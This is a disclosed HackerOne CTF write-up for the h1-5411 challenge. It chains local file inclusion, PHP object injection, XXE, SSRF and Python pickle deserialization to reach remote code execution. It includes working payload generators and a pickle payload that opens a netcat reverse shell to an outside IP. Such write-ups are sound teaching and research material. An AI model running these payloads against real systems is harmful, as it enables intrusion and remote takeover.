# Solution for h15411's CTF challenge

## Report Details
- **Report ID**: 415222
- **URL**: https://hackerone.com/reports/415222
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-09-27T09:27:19.886Z
- **Disclosed**: 2018-10-22T16:26:40.190Z

## Reporter
- **Username**: herrera
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-5411-ctf

## Vulnerability Information
## Baby steps
Earlier today a friend tipped me off about an ongoing CTF challenge that was being run by HackerOne and would get the first ten winners a ticket to participate in #h15411, which will be a live-hacking event happening in Buenos Aires.

This immediately caught my attention and I decided to take a look to see how far I could get.

The first step was decoding the QR code that was in the tweet announcing the challenge (https://twitter.com/Hacker0x01/status/1044974142150373378) and then decoding the hexadecimal value obtained, which in turn gave me the URL of the challenge.

## Game on!

After accessing https://h1-5411.h1ctf.com, it's possible to notice that this application lets you generate memes from six templates which are divided into two different types. Three of which are of the type image and the other three, of type text. The template hidden input also caught my attention, which was apparently being used to load these templates from different files.

This was screaming "PATH TRAVERSAL! LFI!" which was indeed the first way I tried to tackle the challenge (type = image, template=../../../../../../etc/passwd) and needlessly to say I was rick rolled :´(

Shortly after, I tried to change the type to "text" instead of using the type "image" and it worked! I now had the ability to read local files from the server, a vulnerability known as LFI, short for Local File Inclusion.

After downloading all the files from /var/www/html/ I started to analyze the code by first looking into /api/import_memes_2.0.php (because I noticed that in its code it utilized unserialize, which, in the past, has been the source of many vulnerabilities in all sorts of web applications).

I quickly realized that it was possible to upload a file containing serialized code encoded in base64 through import_memes_2.0.php and that it would be saved in the session. Also, looking into /includes/classes.php, there was a class named ConfigFile that had the magic function __toString() which called $this->parse() and then finally tried to load XML from a string that it got from its constructor. This is perfect for an Object Injection attack, which by leveraging the magic method __toString() will allow me to control the value passed to the constructor of the ConfigFile class and then perform a XML External Entity attack when the parse() method is called.

## Coding time

The next step was to create a small php program to generate valid serialized code using a placeholder as the payload.

```
<?php
	require_once("../includes/config.php");

	$config = new ConfigFile("data:text/html,placeholder");
	$payload = serialize([$config]);

	// a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:11:"placeholder";}}
	echo $payload;
?>
```
Then, using python, I created another program that takes a URL as the argument and creates a valid file ready to be uploaded to exploit the XXE vulnerability in the application.

After all my attempts to get RCE using the XXE vulnerability failed, my next big bet was in a SSRF attack. I finished coding the program below and then it was a matter of time to scan the internal network and find the local server running in the port 1337.

```
import base64, sys

url = sys.argv[1]

xml = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxx [ <!ELEMENT xxx ANY >
<!ENTITY payload SYSTEM "php://filter/read=convert.base64-encode/resource=""" + url + """" >]>
<test>
    <toptext>&payload;</toptext>
</test>""";

xml_length = len(xml);

start = 'a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:' + str(xml_length) + ':"'
end   = '";}}'

all = start+xml+end
encoded = base64.b64encode(all)

f = open("payload.memepak", "w")
f.write(encoded)
```

## Reading is fundamental

By reading the documentation API I was able to discover that setting the debug parameter to one would activate the debug mode.

Then, still following the documentation, I made  a request to http://127.0.0.1:1337/status?debug=1 and it returned base64 encoded debug information, that when decoded looked like a pickle object. Shortly after, I made a request to http://127.0.0.1:1337/update-status?debug=1 which said that the status parameter was missing. I sent the request again, but now with the missing status parameter and the response was that it contained an incorrect padding. This got me thinking and then I sent a new request to http://127.0.0.1:1337/update-status?debug=1&status=MSsx (MSsx being 1+1 encoded in base64) and it returned a new debug message about not being able to find MARK.

A quick search in Google and I confirmed my suspicion that this indeed was related to a Pickle Object Serialization vulnerability. Using the template published by mgeeky (https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd), I was able to create a payload that would exploit the vulnerability and force the challenge's server to establish a reverse shell with my server.

```
import cPickle
import sys
import base64

COMMAND = "nc -e /bin/sh 111.111.111.11 1337"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
```
## Last words
Finally, after getting a shell, I executed `ls` and  `cat flag.txt` and got the flag:
**flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}**

Thanks for the challenge and for reading! I had a lot of fun solving it.

## Impact

The attacker could achieve remote code execution which would allow him to get the flag that will get him invited to the #h15411 :)

## Attachments
No attachments
